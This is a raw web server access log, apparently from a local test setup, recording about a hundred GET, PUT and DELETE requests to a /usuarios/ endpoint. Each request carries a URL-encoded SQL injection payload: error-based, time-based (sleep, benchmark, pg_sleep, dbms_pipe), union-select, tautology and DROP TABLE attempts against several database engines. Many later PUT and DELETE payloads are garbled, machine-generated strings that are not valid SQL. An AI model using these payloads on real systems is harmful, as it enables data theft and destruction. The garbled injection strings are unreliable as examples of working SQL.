Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - GET /usuarios/test1'%20)%20as%20vwvp%20where%207951%20=%207951%20and%20row%20(%206237,7469%20)%20%3E%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%206237%20=%206237,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20(%20select%205192%20union HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20as%20pogx%20where%204105%20=%204105%20and%202853%20=%20cast%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%202853%20=%202853%20)%20then%201%20else%200%20end%20)%20)%20::text%7C%7C%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20( HTTP/1.1
172.18.0.1 - GET /usuarios/test1%20)%20as%20ghew%20where%206441%20=%206441%20union%20all%20select%20null,null%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1%22%20)%20)%20and%206240%20=%20(%20'qqpjq'%7C%7C%20(%20select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb$database%20)%20%7C%7C'qzvzq'%20)%20and%20(%20(%20%22mjkl%22%20=%20%22mjkl HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20)%20)%20and%203715%20in%20(%20(%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%203715%20=%203715%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20(%201 HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20)%20and%206055%20=%20ctxsys.drithsx.sn%20(%206055,%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%206055%20=%206055%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20) HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20)%20as%20dcon%20where%209020%20=%209302 HTTP/1.1
172.18.0.1 - GET /usuarios/test1'+%20(%20select%20'rejz'%20where%201530%20=%201530%20and%207756%20=%20dbms_utility.sqlid_to_sqlhash%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%207756%20=%207756%20)%20then%201%20else%200%20end))))) HTTP/1.1
172.18.0.1 - GET /usuarios/test1%25%22%20)%20)%20)%20and%20(%20select%202*%20(%20if%20(%20(%20select%20*%20from%20(%20select%20concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%203484%20=%203484,1%20)%20)%20)%20,0x717a767a71,0x78%20)%20)%20s%20)%20,%208446744073709551610,%208446744073709551610%20)%20) HTTP/1.1
172.18.0.1 - GET /usuarios/test-6014'))%20or%20(8459=8459)*4906%20and%20(('ejlp'='ejlp HTTP/1.1
172.18.0.1 - GET /usuarios/test-3865'%20)%20union%20all%20select%204935,4935,4935,4935,4935%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20as%20nxqp%20where%202429%20=%202429%20and%209660%20=%20(%20select%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1%25'%20)%20)%20)%20or%208466%20=%20benchmark%20(%205000000,md5%20(%200x694a4745%20)%20)%20and%20(%20(%20(%20'%25'%20=%20' HTTP/1.1
172.18.0.1 - GET /usuarios/test1%25'%20)%20)%20)%20and%206537%20=%20dbms_pipe.receive_message%20(%20chr%20(%2076%20)%20%7C%7Cchr%20(%20116%20)%20%7C%7Cchr%20(%20117%20)%20%7C%7Cchr%20(%2065%20)%20,5%20)%20and%20(%20(%20(%20'%25'%20=%20' HTTP/1.1
172.18.0.1 - GET /usuarios/test1%20)%20)%20as%20qsos%20where%202721%20=%202721%20rlike%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20sgvo%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22%25.%22%20or%201%20=%201%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test-7578%25%22%20)%20union%20all%20select%208931,8931,8931,8931,8931,8931%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1%22%20)%20as%20mszg%20where%206184%20=%206184%20rlike%20sleep%20(%205%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20and%20elt%20(%201210%20=%201210,sleep%20(%205%20)%20)%20and%20(%20'gtov'%20like%20'gtov HTTP/1.1
172.18.0.1 - GET /usuarios/test1%20)%20where%206039%20=%206039%20and%202853%20=%20cast%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%202853%20=%202853%20)%20then%201%20else%200%20end%20)%20)%20::text%7C%7C%20(%20chr%20(%201 HTTP/1.1
172.18.0.1 - GET /usuarios/test1%20)%20)%20as%20mmby%20where%203990%20=%203990%20and%208312%20=%20dbms_pipe.receive_message%20(%20chr%20(%2069%20)%20%7C%7Cchr%20(%2079%20)%20%7C%7Cchr%20(%20101%20)%20%7C%7Cchr%20(%2068%20)%20,5%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@(%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@@verscolame%20)%20FROM%20dual%20wHERE%201%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20;)%20,usernatelils%20' HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20;1%20=%201 HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$),%20gancer%20)%20then%20sylec,%20(select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20)%20+' HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20(%20table_samerial,name_NibL_%20S.%20LIMe%20vy,%20tabes;%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentevel%20)%20and%20ingenitibs%20like%20(%201%20,%20DIMEN%20)%20AND%201 HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20lise%20)%2011,%20)%20) HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alectame%20')%20,%20'inve'%20time%20and%20' HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20sybcharaby/**/ HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynot',%20)%20%3Ea/**/ HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20verseoncmant%20(%20(SELECT%20(SELECT%201))%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,adechure%20)%20,%20's HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@@verscolame%20)%20FroM%20(%20SELECT%20DISTINCT%20(%20USERName%20)%20,%20rownum%20aS%20lImiT%20FRoM%20Sys.aLl_useRs%20)%20WHErE%20l HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20usercameredor'%20version%20'pars%20'='1'%20passo222' HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20verale_tembent%20table%20tp HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,wame_terselempipeppepable%20tablename%20than%20thas HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,wame_terselemp'v HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3' HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20OR%20%22%22=%22 HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentybel%20lyat'%20)%20)%20,1,1,1%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20(%20,%20SELECT%20vErsion%20(%20)%20,%20version%20(%20)%20--%201 HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20verseoncmane%20(%20'Dbo2'%20)%20,%3CDES%20--%200o0o0o6o0o1'%20)%20AnD%20true%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20table_schema,table_name;FROM%20information_schema.character_sets%20grup%20)%20$%20)%20AND%20(%20(%20'aica'%20like%20'iacf HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20_(%20,SELECT%20@@VERSION)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%201%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20-%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20S HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20S%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test-1499%20)%20as%20gxfm%20where%209762%20=%209762%20or%205989%20=%204782%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20or%208315%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20and%20(%20'lfhx'%20=%20'lfhx HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20)%20union%20all%20select%20null,null,null,null,null,null,null,null,null HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%20)%20)%20as%20zbcd%20where%201978%20=%201978%20rlike%20(%20select%20(%20case%20when%20(%207689%20=%207689%20)%20then%201%20else%200x28%20end%20)%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test-7584'%20union%20all%20select%201132,1132,1132,1132,1132,1132,1132,1132,1132,1132 HTTP/1.1
172.18.0.1 - PUT /usuarios/test-2053%22%20)%20or%204144%20=%20(%20select%20upper%20(%20xmltype%20(%20chr%20(%2060%20)%20%7C%7Cchr%20(%2058%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%204144%20=%204144%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20( HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%20)%20)%20as%20midl%20where%209046%20=%209046%20and%206537%20=%20dbms_pipe.receive_message%20(%20chr%20(%2076%20)%20%7C%7Cchr%20(%20116%20)%20%7C%7Cchr%20(%20117%20)%20%7C%7Cchr%20(%2065%20)%20,5%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%7C%7C%20(%20select%20'kuxp'%20where%207123%20=%207123%20and%201688%20=%204200 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20)%20)%20or%204411%20=%20(%20select%20count%20(%20*%20)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7%20)%20and%20(%20(%20(%20'narn'%20=%20'narn%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%20)%20where%206954%20=%206954%20and%203824%20=%20benchmark%20(%205000000,md5%20(%200x76555642%20)%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%20)%20)%20as%20juoe%20where%209994%20=%209994%20or%202367%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%20)%20as%20cnpv%20where%204902%20=%204902%20and%20elt%20(%201210%20=%201210,sleep%20(%205%20)%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%20)%20or%20sleep%20(%205%20)%20and%20(%202211%20=%202211 HTTP/1.1
172.18.0.1 - PUT /usuarios/testselect%20pg_sleep%20(%205%20)%20and%20(%20(%20(%20%22%25%22%20=%20%22 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20)%20)%20)%20or%20(%20select%209173%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209173%20=%209173,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.character_sets%20group%20b HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20)%20)%20and%207756%20=%20dbms_utility.sqlid_to_sqlhash%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%207756%20=%207756%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20( HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20)%20)%20and%203707%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20and%20(%20(%20(%20'viad'%20like%20'viad HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20)%20)%20and%206240%20=%20(%20'qqpjq'%7C%7C%20(%20select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb$database%20)%20%7C%7C'qzvzq'%20)%20and%20(%20(%20(%20'bwka'%20=%20'bwka HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20)%20where%207513%20=%207513%20and%20row%20(%206237,7469%20)%20%3E%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%206237%20=%206237,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20(%20select%205192%20union%20select%203785%20union%20select%203931%20union%20select%207158%20) HTTP/1.1
172.18.0.1 - PUT /usuarios/test-2718%22%20or%202724%20in%20(%20(%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%202724%20=%202724%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20(%20113%20)%20+char HTTP/1.1
172.18.0.1 - PUT /usuarios/test-6599%22%20)%20)%20union%20all%20select%202870,2870,2870,2870,2870,2870,2870,2870,2870,2870%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20and%208514%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20)%20and%20'tfso'%20=%20'tfso HTTP/1.1
172.18.0.1 - PUT /usuarios/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22%20(%20.%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20)%20and%207756%20=%20dbms_utility.sqlid_to_sqlhash%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%207756%20=%207756%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20( HTTP/1.1
172.18.0.1 - PUT /usuarios/test-7007'%20)%20)%20union%20all%20select%203084,3084,3084,3084,3084,3084 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%25'%20)%20)%20)%20rlike%20sleep%20(%205%20)%20and%20(%20(%20(%20'%25'%20=%20' HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20)%20as%20obbk%20where%206414%20=%206414%20and%20(%20select%209067%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209067%20=%209067,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.character_sets%20group%20by%20x%20)%20a%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20OR%20'1'='1/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$ty,ly;%20)%20'/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20table_name'%20)%20;%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20lyse%20)%20trom$1;alo/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20)%20velecteversion%20ty%20by%201%20) HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20(%20tull,hankerachoge_tabel_asect%20vible%20(%20123,1%20)%20,NOC%20LIME%20(%201,805,9160%20)%20/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20(%20table_samerial,harcet%20table_a HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20table_schema,table_name%20FROM%20inam$$; HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alecture%20'exal'%20)%20,%20' HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20-%20Table_name,%20DROM%20intor%20gEversion_where%208%20)%20&&%20(SELECT%20(SELECT%201))%20AND%201 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@@verscomance():%20%3C2b0x0x0o0b1010O1B0b11111011001001111111010101010111001010111101011110110111111%20)%20TheN%20REGeXP_SUBstRiNg%20(%20rEpeAT%20(%20rIgHt%20(%20cHar HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20;1%20=%201 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alectame%20')%20,%20'sinct'%20in%20'nocesuant%20where%20nove%20f HTTP/1.1
